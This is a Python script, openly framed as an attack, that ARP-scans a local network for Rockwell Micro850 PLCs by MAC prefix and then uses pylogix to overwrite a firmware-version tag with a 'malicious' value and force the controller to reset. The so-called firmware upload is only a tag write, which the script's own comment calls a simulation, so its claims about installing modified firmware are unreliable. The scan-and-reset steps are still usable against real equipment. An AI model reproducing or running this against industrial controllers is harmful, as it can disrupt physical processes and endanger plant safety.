from scapy.all import ARP, Ether, srp
from pylogix import PLC
import time

# Step 1: Find the PLC IP
def find_plc_ip(network_prefix="192.168.1.1/24"):
    print("[+] Scanning network for Rockwell Micro850 PLC...")

    # Create an Ethernet & ARP request packet to scan the network
    arp = ARP(pdst=network_prefix)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    # Send the packet and collect responses
    result = srp(packet, timeout=3, verbose=False)[0]

    for _, received in result:
        device_ip = received.psrc
        mac_address = received.hwsrc

        # Check if the MAC address matches Rockwell Automation range
        if mac_address.startswith("00:00:BC") or mac_address.startswith("00:80:F3"):
            print(f"[+] Found Rockwell PLC at IP: {device_ip}")
            return device_ip

    print("[-] No Rockwell Micro850 PLC found on the network.")
    return None

# Step 2: Manipulate Firmware Update Settings
def execute_firmware_attack(plc_ip):
    print(f"[+] Attempting firmware update manipulation on PLC at {plc_ip}...")

    try:
        plc = PLC()
        plc.IPAddress = plc_ip

        # Step 2.1: Check PLC status (Read System Info)
        status = plc.GetTag("SysFirmwareVersion")
        if status.Status == "Success":
            print(f"[+] Current Firmware Version: {status.Value}")
        else:
            print("[-] Failed to retrieve firmware information.")

        # Step 2.2: Overwrite Firmware Tag (Simulation of Uploading Malicious Firmware)
        attack_payload = "99.99.99"  # Example of an out-of-date or nonexistent firmware version
        attack_result = plc.Write("SysFirmwareVersion", attack_payload)

        if attack_result.Status == "Success":
            print(f"[!] Uploaded malicious firmware version: {attack_payload}")
        else:
            print("[-] Firmware modification failed.")

        # Step 2.3: Force a Firmware Reload
        restart_result = plc.Write("SysReset", 1)

        if restart_result.Status == "Success":
            print("[!] PLC is restarting with modified firmware...")
        else:
            print("[-] Could not force a restart.")

        plc.Close()

    except Exception as e:
        print(f"[ERROR] An error occurred: {e}")

# Main Execution
if __name__ == "__main__":
    plc_ip = find_plc_ip()

    if plc_ip:
        execute_firmware_attack(plc_ip)
    else:
        print("[-] Exiting program, no PLC found.")